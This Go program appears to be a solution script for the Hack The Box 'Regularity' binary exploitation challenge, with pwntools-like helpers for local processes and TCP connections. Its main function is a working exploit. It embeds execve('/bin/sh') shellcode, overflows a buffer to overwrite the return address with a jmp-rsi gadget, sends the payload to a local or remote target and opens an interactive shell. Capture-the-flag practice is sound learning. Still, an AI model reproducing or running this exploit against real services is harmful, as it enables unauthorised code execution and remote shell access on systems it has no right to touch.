package main

/*
Inspired by 7Rocky pwntools to conduct binary exploitation giving credit here for the pwntools and the HTB scripts

https://github.com/7Rocky/pwntools

https://github.com/7Rocky/HackTheBox-scripts/tree/main

Your awesome 7Rocky!!!

Constructed the below script to solve the regularity challenge on HTB

// Use the GOPATH for development and then transition over to the prep script
// go env -w GOPATH="/home/thepcn3rd/go/workspaces/binaryExploitation"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o urlShortcut.bin -ldflags "-w -s" main.go


*/

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
)

type Conn struct {
	stdin       io.WriteCloser
	stdout      io.ReadCloser
	conn        net.Conn
	isClosed    bool
	isProcess   bool
	host        string
	port        int
	protocol    string
	isRemote    bool
	processPath string
	processID   int
	errChan     chan error
}

var interactiveConn *Conn = nil

func (conn *Conn) Close() {
	if !conn.isClosed {
		conn.isClosed = true
		conn.stdin.Close()
		conn.stdout.Close()

		if conn.isProcess {
			fmt.Printf("Stopped process %s (PID: %d)\n", conn.processPath, conn.processID)
			syscall.Kill(conn.processID, syscall.SIGKILL)
		} else if conn.isRemote {
			fmt.Printf("Closed connection to %s port %s\n", conn.host, string(conn.port))
			conn.conn.Close()
		}
	}
}

func (conn *Conn) RecvUntil(pattern []byte, drop ...bool) []byte {
	var recv []byte
	b := make([]byte, 1)

	for !bytes.HasSuffix(recv, pattern) {
		n, err := conn.stdout.Read(b)

		if err != nil {
			panic(err)
		}

		if n == 1 {
			recv = append(recv, b[0])
		}
	}

	if len(drop) == 1 && drop[0] {
		return bytes.ReplaceAll(recv, pattern, []byte(""))
	}

	return recv
}

func (conn *Conn) SendAfter(pattern, data []byte) []byte {
	recv := conn.RecvUntil(pattern)
	conn.Send(data)
	return recv
}

func (conn *Conn) Send(data []byte) int {
	n, err := conn.stdin.Write(data)

	if err != nil {
		cf.CheckError("Unable to send data", err, true)
		//Error(err.Error())
	}

	return n
}

func (conn *Conn) Recv(n ...int) []byte {
	max := 4096

	if len(n) == 1 {
		max = n[0]
	} else if len(n) > 1 {
		panic("multiple n")
	}

	buf := make([]byte, max)
	read, err := conn.stdout.Read(buf)

	if err != nil {
		return []byte{}
	}

	return buf[:read]
}

func writeInteractive(prompt string) {
	for {
		b := interactiveConn.Recv()

		if len(b) == 0 {
			interactiveConn.errChan <- fmt.Errorf("EOF")
			return
		}

		fmt.Print("\r")
		os.Stdout.Write(b)
		fmt.Print(prompt)
	}
}

func readInteractive(prompt string) {
	reader := bufio.NewReader(os.Stdin)

	for {
		b, err := reader.ReadBytes('\n')

		if len(b) > 0 && err == nil {
			interactiveConn.Send(b)
			fmt.Print(prompt)
		}
	}
}

func (conn *Conn) Interactive(prompt ...string) {
	fmt.Println("Switching to interactive mode")

	if len(prompt) == 0 {
		prompt = append(prompt, " $  ")
	}

	fmt.Print(prompt[0])

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)

	go func() {
		<-c
		conn.errChan <- fmt.Errorf("Control-C")
	}()

	interactiveConn = conn
	go writeInteractive(prompt[0])
	go readInteractive(prompt[0])

	for {
		if err := <-conn.errChan; err != nil {
			if err.Error() == "EOF" {
				fmt.Println("Got EOF while reading in interactive")
			}

			if err.Error() == "Control-C" {
				fmt.Println("Interrupted")
			}

			break
		}
	}

	conn.Close()
}

func wait(cmd *exec.Cmd, conn *Conn) {
	if err := cmd.Wait(); err != nil {
		if !conn.isClosed {
			conn.errChan <- err
		}

		cmd.Process.Kill()
	}
}

func runProcess(command string, args ...string) Conn {
	c := exec.Command(command, args...)
	fmt.Printf("Starting local process '%s'\n", c.Path)
	stdin, err := c.StdinPipe()
	cf.CheckError("Unable to get stdin pipe", err, true)

	stdout, err := c.StdoutPipe()
	cf.CheckError("Unable to get stdout pipe", err, true)

	c.Start()
	fmt.Printf("Process Name: %s\n", c.Path)
	fmt.Printf("PID: %d\n", c.Process.Pid)

	// Build out the connection
	var conn Conn
	conn.isClosed = false
	conn.stdin = stdin
	conn.stdout = stdout
	conn.errChan = make(chan error, 1)
	conn.isProcess = true
	conn.processPath = c.Path
	conn.processID = c.Process.Pid

	// Place the command executed in a wait state within a go routine to not interrupt the program flow...
	go wait(c, &conn)

	fmt.Println()

	return conn
}

// P64 packs a 64-bit unsigned integer
func P64(v uint64) []byte {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, v)
	return b
}

func networkConnection(host string, port string, protocol string) Conn {
	var conn Conn
	conn.host = host

	portInt, err := strconv.Atoi(port)
	cf.CheckError("Unable to convert the port to an integer", err, true)

	conn.port = portInt
	conn.protocol = protocol
	conn.isRemote = true

	fmt.Printf("Opening connection to %s on port %s\n", host, port)

	c, err := net.Dial(protocol, fmt.Sprintf("%s:%s", host, port))
	fmt.Printf("Trying %s:%s\n", host, string(port))

	if err != nil {
		panic(err)
	}

	stdin := io.WriteCloser(c)
	stdout := io.ReadCloser(c)

	conn.stdin = stdin
	conn.stdout = stdout
	conn.errChan = make(chan error, 1)
	conn.conn = c

	return conn

}

func main() {
	var connection Conn
	if len(os.Args) == 1 {
		connection = runProcess("./regularity")
	} else {
		hostPort := strings.Split(os.Args[1], ":")
		connection = networkConnection(hostPort[0], hostPort[1], "tcp")
	}

	defer connection.Close()

	shellcode := []byte("\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05")
	jmpRsiAddr := uint64(0x401041)

	payload := make([]byte, 272)
	copy(payload, shellcode)
	copy(payload[256:], P64(jmpRsiAddr))

	connection.SendAfter([]byte("Hello, Survivor. Anything new these days?\n"), payload)

	connection.Interactive("$ ")

}
